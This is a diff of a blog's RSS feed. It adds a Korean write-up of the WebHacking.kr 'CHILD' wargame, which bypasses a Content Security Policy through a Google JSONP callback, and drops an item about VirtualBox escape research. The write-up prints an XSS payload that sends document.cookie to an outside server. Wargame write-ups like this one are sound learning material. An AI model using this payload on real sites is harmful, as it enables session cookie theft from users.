@@ -9,8 +9,41 @@
     <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>JHYEON BLOG</description>
-    <pubDate>Sat, 10 Jul 2021 23:24:00 GMT</pubDate>
+    <pubDate>Sun, 11 Jul 2021 00:40:00 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>WebHacking.kr CHILD Write up</title>
+      <link>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/</link>
+      <guid>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/</guid>
+      <pubDate>Sun, 11 Jul 2021 00:40:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;인사말&quot;&gt;&lt;a href=&quot;#인사말&quot; class=&quot;headerlink&quot; title=&quot;인사말&quot;&gt;&lt;/a&gt;인사말&lt;/h3&gt;&lt;p&gt;이번엔 웹케알 새 문제 &lt;code&gt;CHILD&lt;/code&gt; 문제에 대한 풀이에요~ 참고하시어 많은 도움이&lt;/p&gt;
+&lt;p&gt;되</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h3><p>이번엔 웹케알 새 문제 <code>CHILD</code> 문제에 대한 풀이에요~ 참고하시어 많은 도움이</p><p>되었으면 좋겠습니다 ㅎㅎ.</p><h3 id="분석"><a href="#분석" class="headerlink" title="분석"></a>분석</h3><p><img src="/img/post/webhackingkr_renew/challenge/child/page.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/page.png" srcset="data:image/png;base64,666" alt="img"></p><p>어라. 페이지가 이전 BABY 문제랑 흡사하네요? 이번에도 CSP 문제일까요~</p><p><img src="/img/post/webhackingkr_renew/challenge/child/csp1.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/csp1.png" srcset="data:image/png;base64,666" alt="img"></p><p>네 맞습니다. CSP 보안 정책이 적용되어있죠? 그런데 이전 문제랑은 조금 다른 정책이 있습니다.</p><p>script-src 리소스에 대해서 <code>https://*.google.com</code> 에서 오는 도메인은 허용하겠다라는 의미인데요.</p><p>그럼 google 도메인을 가지면서 callback으로 응답을 주는 사이트를 활용하면 되는것인데요</p><p>간단하게 <code>jsonp callback endpoint</code> 이라는 내용으로 검색을 해보시면 금방 알아채실거에요~</p><p>예시 사이트들을 알려드리자면 아래 사이트에 google을 포함한 다른 여러 사이트들의 jsonp callback을 알려주는 문서에요.</p><p><a href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt">https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt</a></p><p>허용된 <code>*.google.com</code> 도메인의 <code>jsonp callback</code>을 활용해 XSS를 발생시키고 이전 문제처럼 봇의 쿠키를 탈취하는 문제인데요~~</p><p>저는 <code>https://accounts.google.com/o/oauth2~~</code> 라는 주소를 사용할 거에요.</p><p>그럼 이번엔 페이로드를 어떻게 만들까? BABY 문제처럼 <code>script src</code> 리소스를 불러오는게 없기 때문에</p><p><code>inject</code> 파라미터에 다이렉트로 페이로드를 인젝션해줘야 하는데 <code>script src</code> 리소스를 불러오도록 만들면 되죠?</p><pre><code>`&amp;ltscript+src&amp;gt=&quot;https://accounts.google.com/o/oauth2/revoke?callback=location.href=&#39;https://myserver.com/?flag=&#39;+document.cookie;&quot;&amp;gt&amp;lt/script&amp;gt</code></pre><p>&amp;lt &amp;gt는 각각 &lt; &gt; 을 의미하며 이는.. 블로그 내 게시글 단순 필터링 목적으로 적용하니 참고하여 봐주세요!</p><p>무튼 <code>inject</code> 파라미터에 위 페이로드를 인젝션하게 되면 <code>myserver.com</code> 으로 redirection 이 되는것을 알 수 있어요~</p><p>이 점을 활용해서 report 페이지에 해당 페이로드를 send해서 봇이 사이트에 방문해주도록 만들면?</p><p>플래그 획 ~ 득 ~ 완 ~ 료 !@!</p><p><img src="/img/post/webhackingkr_renew/challenge/child/flag.png" class="lazyload" data-srcset="/img/post/webhackingkr_renew/challenge/child/flag.png" srcset="data:image/png;base64,666" alt="img"></p>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Wargame/">Wargame</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking-kr/">WebHacking.kr</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WebHacking/">WebHacking</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Write-up/">Write up</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/CSP/">CSP</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/07/11/webhackingkr-child-0711/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>WebHacking.kr Baby Write up</title>
@@ -643,40 +676,6 @@
       
       
       <comments>https://blog.jhyeon.dev/2021/04/12/ritsec-ctf-210412/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>VirtualBox Escape Research(CVE 2019-2525 &amp; 2548)</title>
-      <link>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</link>
-      <guid>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</guid>
-      <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;img src=&quot;/img/post/demon/virtualbox/team.png&quot; class=&quot;lazyloa</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><img src="/img/post/demon/virtualbox/team.png" class="lazyload" data-srcset="/img/post/demon/virtualbox/team.png" srcset="data:image/png;base64,666"><p>이번에 소속으로 활동 중인 데몬팀(DEMON TEAM) 팀 세미나 진행을 위해 “VirtualBox Research Study Team” 에서</p><p>VirtualBox Escape (CVE 2019-2525 &amp; 2548) 에 대해 연구했던 자료를 공유합니다.</p><p>발표 자료는 비공개지만, 개인 노션에 정리한 자료는 다음 링크에서 확인할 수 있습니다.</p><p><a href="https://public.jhyeon.dev/research/virtualbox">https://public.jhyeon.dev/research/virtualbox</a></p>]]></content:encoded>
-      
-      
-      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
-      
-      
-      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/VirtualBox/">VirtualBox</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/CVE/">CVE</category>
-      
-      <category domain="https://blog.jhyeon.dev/tags/CVSS/">CVSS</category>
-      
-      
-      <comments>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/#disqus_thread</comments>
       
     </item>
     
